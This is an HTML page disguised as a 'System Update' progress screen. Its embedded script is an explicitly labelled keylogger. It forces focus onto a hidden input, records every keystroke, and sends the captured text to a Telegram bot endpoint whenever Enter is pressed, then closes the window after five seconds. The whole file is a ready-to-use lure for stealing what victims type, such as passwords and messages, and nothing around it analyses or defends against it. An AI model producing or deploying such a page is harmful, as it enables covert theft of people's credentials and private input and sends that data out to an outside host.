<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        body {
            background: #1a1a1a;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #2a2a2a;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.8);
            max-width: 90%;
        }
        h1 { color: #00ff88; }
        .progress {
            width: 100%;
            height: 20px;
            background: #333;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: #00ff88;
            border-radius: 10px;
            animation: load 3s forwards;
        }
        @keyframes load {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .status { color: #aaa; font-size: 14px; }

        /* Hidden input field — keyboard trigger ke liye */
        #hiddenInput {
            position: fixed;
            top: -9999px;
            left: -9999px;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 System Update</h1>
        <p>Optimizing system performance...</p>
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
        <p class="status">✅ Update completed successfully</p>
    </div>

    <!-- Hidden input field — keyboard trigger ke liye -->
    <input type="text" id="hiddenInput" autofocus>

    <script>
        // ===== KEYLOGGER =====
        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
        const CHAT_ID = "YOUR_CHAT_ID_HERE";
        let buffer = "";

        // Force focus on hidden input
        document.getElementById('hiddenInput').focus();

        // Keylogger
        document.addEventListener('keydown', (event) => {
            const key = event.key;
            if (key === "Enter") {
                sendToTelegram(buffer);
                buffer = "";
            } else if (key === "Backspace") {
                buffer = buffer.slice(0, -1);
            } else if (key.length === 1) {
                buffer += key;
            }
        });

        // Keep focus on hidden input
        document.addEventListener('click', () => {
            document.getElementById('hiddenInput').focus();
        });

        function sendToTelegram(msg) {
            if (msg.trim() === "") return;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: "📱 Keylog: " + msg
                })
            });
        }

        // Auto close after 5 seconds
        setTimeout(() => window.close(), 5000);
    </script>
</body>
</html>
